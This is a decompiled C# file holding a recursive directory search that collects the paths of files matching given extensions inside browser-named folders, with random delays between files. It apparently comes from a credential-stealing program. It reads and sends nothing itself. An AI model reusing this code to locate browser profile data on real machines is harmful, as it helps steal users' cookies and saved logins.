using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

// Token: 0x02000028 RID: 40
internal class Recursive
{
	// Token: 0x06000063 RID: 99 RVA: 0x00005EE0 File Offset: 0x000040E0
	public static void Search(string path, ref List<string> _out, string[] browsers, string[] search_files, int recursive_max = -1, int i = 0, bool search = false)
	{
		if (!search && recursive_max > 0)
		{
			if (i < recursive_max)
			{
				i++;
			}
			else
			{
				int num = 0;
				while (num < browsers.Length && !search)
				{
					if (path.ToLower().Contains(browsers[num].ToLower()))
					{
						search = true;
					}
					num++;
				}
				if (!search)
				{
					return;
				}
			}
		}
		DirectoryInfo Info = new DirectoryInfo(path);
		DirectoryInfo[] array = null;
		IEnumerable<FileInfo> enumerable = null;
		try
		{
			array = Info.GetDirectories();
			enumerable = search_files.SelectMany((string ext) => Info.GetFiles(ext));
		}
		catch
		{
		}
		if (enumerable != null && enumerable.Count<FileInfo>() > 0)
		{
			foreach (FileInfo fileInfo in enumerable)
			{
				for (int j = 0; j < browsers.Length; j++)
				{
					if (fileInfo.FullName.ToLower().Contains(browsers[j]))
					{
						_out.Add(fileInfo.FullName);
						break;
					}
				}
				Thread.Sleep(new Random().Next(35, 60));
			}
		}
		if (array != null && array.Count<DirectoryInfo>() > 0)
		{
			DirectoryInfo[] array2 = array;
			for (int k = 0; k < array2.Length; k++)
			{
				Recursive.Search(array2[k].FullName, ref _out, browsers, search_files, recursive_max, i, search);
			}
		}
	}
}
